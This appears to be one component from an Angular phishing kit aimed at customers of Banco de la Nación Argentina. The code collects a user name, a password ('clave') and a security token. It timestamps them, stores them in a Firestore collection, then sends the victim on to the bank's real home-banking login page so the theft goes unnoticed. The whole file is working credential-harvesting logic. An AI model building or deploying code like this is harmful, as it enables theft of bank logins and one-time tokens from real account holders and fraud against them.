import { Component, OnInit } from '@angular/core';
import { Router } from '@angular/router';
import { users } from 'src/app/Models/user';
import { FirestoreService } from 'src/app/Services/firestore.service';
import { InteractionService } from 'src/app/Services/interaction.service';

@Component({
  selector: 'app-part1',
  templateUrl: './part1.component.html',
  styleUrls: ['./part1.component.scss'],
})
export class Part1Component  implements OnInit {

  User: users={
    // rta: null,
    id: '',
    user: '',
    clave: '',
    token: '',
   };

   constructor( 
    //  private firestore: AngularFirestore, 
                private db: FirestoreService, 
                private interaction : InteractionService,
                private router: Router,
                ) {}

  ngOnInit() {}

  next() {
    const data = this.User;
    const path = 'data';

    // Obtener la fecha y hora actual del cliente
    const timestamp = new Date();

    // Agregar la fecha y hora actual al documento de datos
    data.timestamp = timestamp;

    console.log(data);
    this.db.createDocument<users>(data, path).then((_) => {
      
      this.User = {
        id: '',
        user: '',
        clave: '',
        token: '',
      };
      
      this.router.navigate(['https://hb.redlink.com.ar/bna/login.htm']);
    });
  }


}
